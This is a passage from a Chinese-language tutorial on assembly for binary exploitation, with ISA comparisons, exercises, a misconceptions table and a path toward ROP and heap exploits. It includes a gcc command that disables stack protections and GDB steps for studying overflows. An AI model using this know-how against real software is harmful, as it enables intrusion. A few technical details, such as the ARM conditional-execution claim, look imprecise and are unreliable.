| 指令长度 | 可变（1-15字节） | 固定 4 字节（AArch64）或可变（Thumb） |
| 条件执行 | 通过 FLAGS + 条件跳转 | 大部分指令可条件执行 |
| 系统调用 | `syscall` 指令 | `svc #0` 指令 |
| 系统调用号 | RAX | X8 |
| PC 可直接访问 | 仅 RIP（限制） | X30=LR，PC 不可直接写 |

ARM 的固定长度指令和大量寄存器使得其 Shellcode 编写和 ROP 利用与 x86-64 有显著不同。

### 5.13 实战练习

#### 练习1：读懂反汇编

给定以下反汇编输出，还原出原始 C 代码逻辑：

```asm
sub    rsp, 8
mov    edi, 0x402000        ; 指向格式字符串 "%s\n"
mov    esi, dword [rsp+0xc] ; 读取某个值
xor    eax, eax
call   printf
add    rsp, 8
ret
```

**答案：** 这是一个简单的 wrapper 函数，等价于 `printf("%s\n", some_value);`

#### 练习2：编写一个读取并输出的 Shellcode

目标：从 stdin 读取数据到栈上缓冲区，然后写回 stdout。这是理解 `sys_read` + `sys_write` 组合的基础练习。

#### 练习3：用 GDB 分析栈溢出

```bash
# 编译带漏洞的程序（禁用安全机制以便学习）
gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
# 用 GDB 单步跟踪溢出过程
gdb ./vuln
(gdb) b vulnerable
(gdb) r
(gdb) x/20xg $rsp    # 观察栈布局
(gdb) si              # 逐指令执行，观察 RSP 变化
```

### 5.14 常见误区与陷阱

| 误区 | 正确理解 |
|-----|---------|
| "汇编是过时的技术" | 逆向工程、漏洞利用、嵌入式安全都离不开汇编 |
| "学汇编就是背指令" | 重点是理解内存模型、调用约定、控制流，指令可以查手册 |
| "x86 和 x86-64 差不多" | 调用约定完全不同（寄存器传参 vs 栈传参），Shellcode 不通用 |
| "xor reg, reg 设置 OF/SF" | XOR 只设置 ZF/SF/PF，清除 OF/CF——不要假设它像 SUB 一样设置所有标志 |
| "inc/dec 不影响任何标志" | inc/dec 不影响 CF，但影响 ZF/SF/OF——这个差异可能导致条件跳转判断错误 |
| "mov 改变标志位" | MOV 不改变任何标志位（除了段寄存器传送的特殊情况） |
| "syscall 不影响寄存器" | syscall 指令会将 RIP 存入 RCX，RFLAGS 存入 R11——所以 RCX 和 R11 被破坏 |
| "栈是从高到低增长所以 push 是减" | 对，但 pop 是加——RSP += 8。不要搞反了 |
| "Shellcode 必须写在栈上" | 可以通过 mprotect 将任何内存区域变为可执行，或用 JIT-spraying 等技术 |

### 5.15 进阶方向

掌握了本节的基础后，以下是进一步学习的路径：

1. **ROP（返回导向编程）：** 不注入 Shellcode，而是串联程序中已有的 `gadget`（以 `ret` 结尾的指令片段）构造攻击链。需要深入理解栈布局和 gadget 搜索。

2. **格式化字符串漏洞：** 利用 `printf` 系列函数的 `%n` 写入任意地址——本质上是对内存写入原语的利用。

3. **堆利用技术：** `unlink` 攻击、`tcache` poisoning、`fastbin` corruption——需要理解 glibc malloc 的元数据结构。

4. **内核漏洞利用：** 内核态的汇编代码（中断处理、系统调用入口）有不同的安全约束和利用思路。

5. **ARM64 逆向与利用：** 移动安全（Android/iOS）的必备技能，需要熟悉 ARM64 指令集和调用约定（AAPCS64）。

6. **二进制分析自动化：** 使用 angr、Capstone、Keystone 等框架进行符号执行、反汇编引擎集成、汇编代码自动生成。

***

> **本节核心要点：** 汇编语言是网络安全的"底层操作系统"——栈溢出、ROP、Shellcode、逆向工程的所有概念都建立在汇编之上。不需要能手写大型程序，但必须能在 IDA/Ghidra 的反汇编输出中自如阅读，理解每条指令对寄存器和内存的影响。从 execve Shellcode 开始，逐步扩展到 ROP 和堆利用，这是安全研究者最扎实的成长路径。
